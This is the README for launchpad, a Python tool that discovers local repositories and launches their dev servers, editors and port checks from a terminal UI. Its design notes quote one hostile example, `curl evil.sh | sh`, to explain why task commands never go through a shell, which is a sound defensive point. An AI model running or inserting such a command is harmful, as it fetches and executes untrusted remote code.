# launchpad

**Pick a repo. Get its entire dev environment running. One keystroke.**

Editor opens, every dev server and sidecar starts, ports are checked before anything boots, logs stream into one pane, and one more keystroke tears the whole process tree down.

Scans **32 repos in 151 ms** (median of 7 cold runs, Windows 11, NVMe) and derives run commands for **18 of them with zero configuration**. 167 tests, 82% coverage, pyright clean.

```
$ launch
┌ launchpad ──────────────────────────────────────────────────────────┐
│   project                stack   tasks              branch          │
│ ● relay                  Go+TS   gateway + web      main *3         │
│ ○ collabboard            TS      dev                develop ↑1      │
│ ○ ledger-engine          Java    bootRun            main            │
│ ○ regin                  Py      —                  main *12        │
├─────────────────────────────────────────────────────────────────────┤
│ → relay                                                             │
│   ! web: .env.example exists but .env is missing                    │
│   ✓ editor C:/Users/tdmne/Desktop/experiments/relay                 │
│   ✓ gateway pid 21884                                               │
│   ✓ web     pid 12312 :3000 ready                                   │
│ [gateway] listening on :8080                                        │
│ [web]     ✓ Ready in 1.4s                                           │
└─────────────────────────────────────────────────────────────────────┘
 enter launch · e editor · s stop · R restart · d doctor · f force · / filter
```

## Why this exists

Every morning starts the same way: `cd` somewhere, open the editor, start the API, start the web app, start Redis, wait, find the port is still held by yesterday's zombie, kill it, start again.

Existing tools each solve one slice:

| | Finds your repos | Runs N processes | Windows-native | Zero config |
|---|---|---|---|---|
| tmuxinator / overmind / foreman | ✗ | ✓ | ✗ | ✗ |
| mprocs / concurrently | ✗ | ✓ | ~ | ✗ |
| zoxide / tmux-sessionizer | ✓ (jump only) | ✗ | ~ | ✓ |
| docker compose | ✗ | ✓ (containers) | ✓ | ✗ |
| **launchpad** | **✓** | **✓** | **✓** | **✓** |

launchpad is the intersection: it *finds* your projects, *infers* how to run them, and manages the processes — on Windows as a first-class target, not an afterthought.

## Install

```sh
git clone https://github.com/Surge77/launchpad && cd launchpad
python -m venv .venv
.venv\Scripts\activate           # Windows
source .venv/bin/activate        # macOS / Linux
pip install -e .
```

Point it at your code:

```sh
setx LAUNCHPAD_ROOT "C:\Users\you\Desktop\experiments"     # Windows
export LAUNCHPAD_ROOT="$HOME/code"                         # Unix (add to your shell rc)
```

Then just run `launch`.

## Commands

| Command | What it does |
|---------|--------------|
| `launch` | TUI — browse, filter, launch, restart, stop, watch logs |
| `launch ls` | Every project, stack, tasks, run state. `--git` adds branch/dirty, `--json` for scripts |
| `launch up <name>...` | Launch one or more projects. Partial names work (`launch up collab`) |
| `launch restart <name>` | Stop, wait for the port to actually release, start again |
| `launch stop [name]` | Stop one project, or everything if omitted |
| `launch ps` | Every process launchpad is tracking. `--json` supported |
| `launch doctor [name]` | Explain why a project *would* fail to launch — before you launch it |
| `launch logs <name>` | Task logs. `-f` follows, `-n` sets history depth |

Flags on `up`: `--no-editor` (processes only), `--no-wait` (skip port readiness), `--force` (kill whatever holds a needed port, then launch).

### TUI keys

`enter` launch · `e` editor only · `s` stop · `R` restart · `d` doctor · `f` force launch · `/` filter · `r` rescan · `q` quit

## Features

**Zero-config stack detection.** Reads the repo's own manifests and lockfiles:

| Marker | Command | Port |
|--------|---------|------|
| `package.json` with `dev`/`start`/`serve` | `pnpm dev` / `yarn dev` / `bun dev` / `npm run dev`, chosen by lockfile | 3000 Next, 5173 Vite |
| `pom.xml` with spring-boot | `mvn spring-boot:run` | 8080 |
| `build.gradle[.kts]` | `gradlew bootRun` | 8080 |
| `Cargo.toml` | `cargo run` | — |
| `go.mod` | `go run ./...` | — |
| `pyproject.toml` / `requirements.txt` with fastapi / django / flask | `uvicorn` / `runserver` / `flask run` | 8000 / 8000 / 5000 |

**Monorepo aware.** A repo with no root manifest gets its subdirectories scanned, each becoming a task named after its folder — `relay` resolves to `Go+TS`, tasks `gateway + web`.

**Pre-flight checks.** Before spawning anything, launchpad verifies the executable is on PATH, the working directory exists, the port is free — *and names the process squatting on it*. It also flags the classic silent killer: a `.env.example` with no `.env`. Errors block the launch; warnings just print.

```
$ launch doctor collabboard

collabboard (TS)
  ✓ dev: pnpm found
  ✗ dev: port 3000 already held by pid 24180 (node.exe)
  ! collabboard: .env.example exists but .env is missing

1 blocking issue(s)
```

`launch up collabboard --force` kills the squatter and proceeds. If the holder genuinely can't be identified — naming a socket's owner needs root on macOS, and launchpad won't guess a PID — it says so and aborts rather than launching into the crash it was meant to prevent. Ports held by servers launchpad itself started are always identifiable, root or not.

**Live log streaming.** Every task's stdout/stderr lands in a log file and streams into the TUI pane, prefixed per task. `launch logs <name> -f` does the same in a plain terminal. Children run with `PYTHONUNBUFFERED=1`, so a Python server's output — including a startup traceback — shows up immediately instead of sitting in an 8 KB buffer.

**Frecency ordering.** Projects you launch often and recently rise to the top — one recent launch outranks a month-stale favourite, so the list tracks what you're working on now.

**Git status at a glance.** Branch, dirty count, ahead/behind per repo, fetched through a thread pool: 32 repos cost 383 ms total instead of the ~2 s a serial loop of `git status` would take. Off by default so the plain list stays instant.

**Safe restarts.** `restart` kills the process tree, waits for the port to leave `TIME_WAIT`, *then* relaunches — no self-inflicted `EADDRINUSE`.

## Configuration

Detection is a fallback. Drop a `launcher.toml` in any repo for full control:

```toml
editor = "code"            # optional; else $LAUNCHPAD_EDITOR, else code

[[task]]
name = "db"
cmd  = "docker compose up postgres redis"

[[task]]
name = "api"
cmd  = "mvn spring-boot:run"
cwd  = "services/api"      # relative to the repo; must stay inside it
port = 8080

[[task]]
name = "web"
cmd  = "pnpm dev"
cwd  = "apps/web"
port = 3000
open = true                # open the browser once the port accepts connections
env  = { NEXT_PUBLIC_API = "http://localhost:8080" }
```

Tasks start in order, and a task with a `port` blocks until that port accepts a connection (30 s cap) before the next starts — so `open = true` never races a half-compiled server, and `api` is genuinely up before `web` talks to it.

Full reference: [docs/CONFIGURATION.md](docs/CONFIGURATION.md). Internals: [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md).

## Design decisions worth knowing

**Process identity, not bare PIDs.** State stores `(pid, create_time)`. After a hard crash the OS can recycle a dead server's PID, and a PID-only `stop` would kill an unrelated process; matching creation time makes the check exact. Dead entries are pruned on every read.

**No shell, ever.** Task commands come from a repo's config file, so they never touch a shell — `shell=True` would make `pnpm dev && curl evil.sh | sh` a working config. `argv[0]` is resolved with `shutil.which()`, which is also precisely what makes Windows `.cmd` shims (`pnpm`, `gradlew`) run without one. `cwd` is rejected if absolute or containing `..`, validated against both POSIX and Windows path flavours — `Path("/etc").is_absolute()` is `False` on Windows, so a single check would miss it.

**Full-tree teardown.** `stop` walks children recursively, sends `terminate`, waits 5 s, then `kill`s survivors. A `next dev` parent can exit while its worker keeps port 3000 — the orphan then breaks your *next* launch and looks like launchpad's bug.

**Fast by default, slow only on request.** Discovery touches the filesystem only. Git status is opt-in (`--git`) and threaded, so `launch ls` stays at ~151 ms across 32 repos.

State and logs live in `%LOCALAPPDATA%\launchpad\` (Windows) or `~/.local/share/launchpad/` (Unix); override with `LAUNCHPAD_HOME`.

## Development

```sh
pip install -e ".[dev]"
python -m pytest --cov=launchpad --cov-report=term-missing
python -m pyright
```

**167 tests · 82% line coverage · 0 pyright errors.**  Non-UI modules run 89–97%; `tui.py` is at 24% by design — Textual widget wiring is verified by hand, and the launch → probe → stop cycle is covered end-to-end against a real HTTP server binding a real port.

CI runs both gates on Linux, macOS, and Windows against Python 3.11 and 3.12.

See [CONTRIBUTING.md](CONTRIBUTING.md) for the workflow and [CLAUDE.md](CLAUDE.md) if you're working on this with an AI agent.

## License

MIT — see [LICENSE](LICENSE).
